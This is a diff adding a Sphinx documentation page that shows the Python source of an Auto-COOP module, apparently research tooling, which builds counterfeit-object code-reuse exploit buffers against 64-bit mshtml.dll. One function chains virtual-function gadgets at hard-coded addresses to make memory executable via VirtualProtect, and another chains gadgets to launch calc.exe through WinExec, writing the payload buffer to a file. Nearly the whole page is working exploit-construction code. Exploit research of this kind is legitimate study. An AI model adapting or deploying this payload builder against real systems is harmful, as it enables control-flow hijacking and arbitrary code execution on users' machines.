@@ -1,0 +1,291 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>autocoop.builder.exp_mshtml_dummy_64 &#8212; Auto-COOP  documentation</title>
+    <link rel="stylesheet" href="../../../_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+    <script type="text/javascript" id="documentation_options" data-url_root="../../../" src="../../../_static/documentation_options.js"></script>
+    <script type="text/javascript" src="../../../_static/jquery.js"></script>
+    <script type="text/javascript" src="../../../_static/underscore.js"></script>
+    <script type="text/javascript" src="../../../_static/doctools.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+   
+  <link rel="stylesheet" href="../../../_static/custom.css" type="text/css" />
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
+
+  </head><body>
+  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          
+
+          <div class="body" role="main">
+            
+  <h1>Source code for autocoop.builder.exp_mshtml_dummy_64</h1><div class="highlight"><pre>
+<span></span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">builder</span> <span class="k">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">_createInitObject</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+
+    <span class="n">VINDEX_INIT</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">ADDR_PTR_CALL_GADGET</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x18078A520</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; Create initial object that transfers control flow to the looped call gadget:</span>
+<span class="sd">    CExtendedTagNamespace::Passivate</span>
+<span class="sd">    [rcx+4Ch] needs to carry the length of the object array.</span>
+<span class="sd">    [rcx+50h] needs to point to the beginning of out object array.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">objInit</span> <span class="o">=</span> <span class="n">Obj64</span><span class="p">()</span>
+    <span class="n">objInit</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">ADDR_PTR_CALL_GADGET</span> <span class="o">-</span> <span class="n">VINDEX_INIT</span><span class="p">)</span>
+    <span class="n">objInit</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addDword</span><span class="p">(</span><span class="mh">0x4c</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>
+    <span class="n">ptrObjArray</span> <span class="o">=</span> <span class="n">baseBuff</span> <span class="o">+</span> <span class="mh">0x50</span> <span class="o">+</span> <span class="mi">8</span>
+    <span class="n">objInit</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addQword</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="n">ptrObjArray</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">objInit</span>
+
+<div class="viewcode-block" id="exp0"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.exp_mshtml_dummy_64.exp0">[docs]</a><span class="k">def</span> <span class="nf">exp0</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="n">maxOffset</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">    Invokes :code:`VirtualProtect(this, *, *, *)`</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="c1"># create relocator for mshtml.dll</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">Relocator</span><span class="p">(</span><span class="mh">0x180000000</span><span class="p">,</span> <span class="n">baseMod</span><span class="p">)</span>
+
+    <span class="c1"># constants</span>
+    <span class="n">VINDEX_MAIN</span> <span class="o">=</span> <span class="mi">2</span> 
+    <span class="n">ADDR_IAT_VirtualProtect</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x18150D8F0</span><span class="p">)</span>
+    <span class="n">ADDR_SCRATCH_MEMORY</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x18139C680</span><span class="p">)</span> <span class="c1"># beginning of .data section</span>
+    <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="o">=</span> <span class="mh">0x40</span>
+
+    <span class="n">objInit</span> <span class="o">=</span> <span class="n">_createInitObject</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="n">buffInit</span> <span class="o">=</span> <span class="n">objInit</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">getBuffer</span><span class="p">()</span>
+
+    <span class="c1"># create builder for other objects </span>
+    <span class="n">b</span> <span class="o">=</span> <span class="n">Builder</span><span class="p">(</span><span class="n">baseBuff</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">buffInit</span><span class="p">))</span>
+
+    <span class="c1">## 1) load args to VirtualProtect</span>
+    <span class="sd">&quot;&quot;&quot; CWigglyShape::OffsetShape</span>
+<span class="sd">        r8  =&gt;  dword ptr [rcx+0ch]</span>
+<span class="sd">        r9  =&gt;  qword ptr [rcx+10h]</span>
+<span class="sd">        req: r8 == 0</span>
+
+<span class="sd">    Load r9 with pointer to scratch area.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj0</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">VINDEX_MAIN</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x180C3B280</span><span class="p">))</span> 
+    <span class="n">obj0</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addQword</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">qword</span><span class="o">=</span><span class="n">ADDR_SCRATCH_MEMORY</span><span class="p">)</span>
+    <span class="n">obj0</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addDword</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mh">0xc</span><span class="p">,</span> <span class="n">dword</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj0</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; CDXRenderTarget3D::GetBoundFrameBuffer</span>
+<span class="sd">        rax  =&gt;  ((((qword ptr [rcx+28h]-(qword ptr [rcx+20h])))!=0)*qword ptr [rcx+28h])</span>
+<span class="sd">        rdx  =&gt;  qword ptr [rcx+28h]</span>
+
+<span class="sd">    Load rdx with a random pointer to writable memory to compensate for next gadget.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj1</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">VINDEX_MAIN</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x180CCABB8</span><span class="p">))</span> 
+    <span class="n">obj1</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addQword</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">qword</span><span class="o">=</span><span class="n">ADDR_SCRATCH_MEMORY</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj1</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; CStyleSheetArrayVarEnumerator::MoveNextInternal</span>
+<span class="sd">        dword ptr [rdx]  =&gt;  0</span>
+<span class="sd">        rax  =&gt;  qword ptr [rcx+28h]</span>
+<span class="sd">        r8  =&gt;  (dword ptr [rcx+30h]+1)</span>
+
+<span class="sd">        dword ptr [rcx+30h]  =&gt;  r8</span>
+
+<span class="sd">        rax  =&gt;  0</span>
+
+<span class="sd">    Load r8. rcx+0x28 needs to point to readable memory.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj2</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">VINDEX_MAIN</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x180BE377C</span><span class="p">))</span> 
+    <span class="n">obj2</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addDword</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mh">0x30</span><span class="p">,</span> <span class="n">dword</span><span class="o">=</span><span class="n">PAGE_EXECUTE_READWRITE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">obj2</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addQword</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">qword</span><span class="o">=</span><span class="n">ADDR_SCRATCH_MEMORY</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj2</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; CDXRenderTarget3D::GetBoundFrameBuffer</span>
+<span class="sd">    [...]</span>
+<span class="sd">    Load rdx with size of region. &#39;1&#39; is enough to make entire page writable.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj3</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">VINDEX_MAIN</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x180CCABB8</span><span class="p">))</span> 
+    <span class="n">obj3</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addQword</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">qword</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj3</span><span class="p">)</span>
+
+    <span class="c1">## 2) branch to VirtualProtect</span>
+    <span class="c1"># create object reference</span>
+    <span class="n">obj4</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">noFakeVtable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">obj4</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">ADDR_IAT_VirtualProtect</span> <span class="o">-</span> <span class="n">VINDEX_MAIN</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj4</span><span class="p">)</span>
+
+    <span class="n">buffMain</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="n">finalize</span><span class="p">(</span><span class="n">maxOffset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buffInit</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">buffInit</span> <span class="o">+</span> <span class="n">buffMain</span></div>
+
+<div class="viewcode-block" id="exp1"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.exp_mshtml_dummy_64.exp1">[docs]</a><span class="k">def</span> <span class="nf">exp1</span><span class="p">(</span><span class="n">baseMod</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="n">maxOffset</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Invokes WinExec(&#39;calc.exe&#39;, &lt;something&gt;) &quot;&quot;&quot;</span>
+
+    <span class="c1"># create relocator</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">Relocator</span><span class="p">(</span><span class="mh">0x180000000</span><span class="p">,</span> <span class="n">baseMod</span><span class="p">)</span>
+
+    <span class="c1"># constants</span>
+    <span class="n">VINDEX_MAIN</span> <span class="o">=</span> <span class="mi">2</span> 
+    <span class="n">ADDR_SCRATCH_MEMORY</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x18139C680</span><span class="p">)</span> <span class="c1"># beginning of .data section</span>
+    <span class="n">ADDR_PTR_CreateEventExW</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x18150D448</span><span class="p">)</span>
+    <span class="n">OFFSET_CreateEventExW_WinExec</span> <span class="o">=</span> <span class="mh">0xd906c</span>
+
+    <span class="k">class</span> <span class="nc">LABEL</span><span class="p">:</span>
+        <span class="n">WINEXEC</span><span class="p">,</span> <span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">,</span> <span class="n">CMD</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+
+    <span class="c1"># create init object/buffer</span>
+    <span class="n">objInit</span> <span class="o">=</span> <span class="n">_createInitObject</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+    <span class="n">buffInit</span> <span class="o">=</span> <span class="n">objInit</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">getBuffer</span><span class="p">()</span>
+
+    <span class="c1"># create builder for other objects </span>
+    <span class="n">b</span> <span class="o">=</span> <span class="n">Builder</span><span class="p">(</span><span class="n">baseBuff</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">buffInit</span><span class="p">))</span>
+
+    <span class="c1"># create other objects</span>
+    <span class="sd">&quot;&quot;&quot; CDXRenderTarget3D::GetBoundFrameBuffer</span>
+<span class="sd">        rax  =&gt;  ((((qword ptr [rcx+28h]-(qword ptr [rcx+20h])))!=0)*qword ptr [rcx+28h])</span>
+<span class="sd">        rdx  =&gt;  qword ptr [rcx+28h]</span>
+
+<span class="sd">    Load pointer to IAT to rdx. </span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj0</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">VINDEX_MAIN</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x180CCABB8</span><span class="p">))</span> 
+    <span class="n">obj0</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addQword</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span> <span class="n">qword</span><span class="o">=</span><span class="n">ADDR_PTR_CreateEventExW</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj0</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; CRectShape::OffsetShape</span>
+<span class="sd">        dword ptr [rcx+8]  =&gt;  dword ptr [rcx+8]+(dword ptr [rdx])</span>
+<span class="sd">        dword ptr [rcx+0ch]  =&gt;  dword ptr [rcx+0ch]+(dword ptr [rdx+4])</span>
+<span class="sd">        dword ptr [rcx+10h]  =&gt;  dword ptr [rcx+10h]+(dword ptr [rdx])</span>
+<span class="sd">        dword ptr [rcx+14h]  =&gt;  dword ptr [rcx+14h]+(dword ptr [rdx+4])</span>
+<span class="sd">        rax  =&gt;  dword ptr [rdx+4]</span>
+
+<span class="sd">    Add offset to pointer in rdx and store the result at a labeled location.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj1</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">VINDEX_MAIN</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x180C3B260</span><span class="p">))</span>
+    <span class="n">obj1</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addQword</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span> <span class="n">qword</span><span class="o">=</span><span class="n">OFFSET_CreateEventExW_WinExec</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">WINEXEC</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj1</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; Ptls6::CLsBlockObject::Display </span>
+<span class="sd">    qword ptr [rsp+10h]  =&gt;  rdx</span>
+<span class="sd">    qword ptr [rsp+8]  =&gt;  rcx</span>
+<span class="sd">    _128bits ptr [rsp-18h]  =&gt;  unknown</span>
+<span class="sd">    rax  =&gt;  qword ptr [rcx+10h]</span>
+<span class="sd">    rcx  =&gt;  qword ptr [qword ptr [qword ptr [rcx+10h]+8]+8]</span>
+<span class="sd">    rdx  =&gt;  (rsp-18h)</span>
+<span class="sd">    rsp  =&gt;  (rsp-38h)</span>
+<span class="sd">    r8  =&gt;  rdx</span>
+<span class="sd">    r9  =&gt;  qword ptr [qword ptr [rcx+10h]+8]</span>
+<span class="sd">    r11  =&gt;  rsp</span>
+
+<span class="sd">    call qword ptr [qword ptr [qword ptr [rcx+10h]+8]+30]</span>
+
+<span class="sd">    rsp  =&gt;  (rsp+38h)</span>
+
+<span class="sd">    Invoke WinExec. [rcx+10] needs to point to obj2a.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj2</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">VINDEX_MAIN</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x18022F2B0</span><span class="p">))</span>
+    <span class="n">obj2</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">targetLabel</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">A</span><span class="p">,</span> <span class="n">targetOffset</span><span class="o">=-</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj2</span><span class="p">)</span>
+
+    <span class="c1">## create helper objects that serve as data containers</span>
+    <span class="c1"># TODO: take care that these objects are not contained in the object array.</span>
+    <span class="n">obj2a</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">noFakeVtable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">obj2a</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span> <span class="n">targetLabel</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">B</span><span class="p">,</span> <span class="n">targetOffset</span><span class="o">=-</span><span class="mi">8</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">A</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj2a</span><span class="p">)</span>
+
+    <span class="n">obj2b</span> <span class="o">=</span> <span class="n">Object</span><span class="p">(</span><span class="n">noFakeVtable</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+    <span class="n">obj2b</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mi">8</span><span class="p">,</span> <span class="n">targetLabel</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">CMD</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">B</span><span class="p">)</span>
+    <span class="n">obj2b</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s2">&quot;calc.exe</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">CMD</span><span class="p">)</span>
+    <span class="n">obj2b</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addQword</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mh">0x30</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">WINEXEC</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj2b</span><span class="p">)</span>
+
+    <span class="n">buffMain</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="n">finalize</span><span class="p">(</span><span class="n">maxOffset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buffInit</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">buffInit</span> <span class="o">+</span> <span class="n">buffMain</span></div>
+    
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">&quot;Usage: </span><span class="si">%s</span><span class="s2"> &lt;mshtml base&gt; &lt;buffer base&gt; &lt;output path&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+
+    <span class="n">baseMod</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">baseBuff</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="n">exp1</span><span class="p">(</span><span class="n">baseMod</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="mi">4096</span><span class="p">)</span>
+    
+    <span class="n">f</span> <span class="o">=</span> <span class="n">file</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="nb">print</span> <span class="s2">&quot;[i] Wrote </span><span class="si">%d</span><span class="s2"> bytes.&quot;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    
+</pre></div>
+
+          </div>
+          
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+<h1 class="logo"><a href="../../../index.html">Auto-COOP</a></h1>
+
+
+
+
+
+
+
+
+<h3>Navigation</h3>
+<p class="caption"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../../installation.html">Installation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../installation.html#running-auto-coop">Running Auto-COOP</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../modules.html">Packages</a></li>
+</ul>
+
+<div class="relations">
+<h3>Related Topics</h3>
+<ul>
+  <li><a href="../../../index.html">Documentation overview</a><ul>
+  <li><a href="../../index.html">Module code</a><ul>
+  </ul></li>
+  </ul></li>
+</ul>
+</div>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <div class="searchformwrapper">
+    <form class="search" action="../../../search.html" method="get">
+      <input type="text" name="q" />
+      <input type="submit" value="Go" />
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+    </div>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+        </div>
+      </div>
+      <div class="clearer"></div>
+    </div>
+    <div class="footer">
+      &copy;2018, Richard Viehoever.
+      
+      |
+      Powered by <a href="http://sphinx-doc.org/">Sphinx 1.7.6</a>
+      &amp; <a href="https://github.com/bitprophet/alabaster">Alabaster 0.7.11</a>
+      
+    </div>
+
+    
+
+    
+  </body>
+</html>
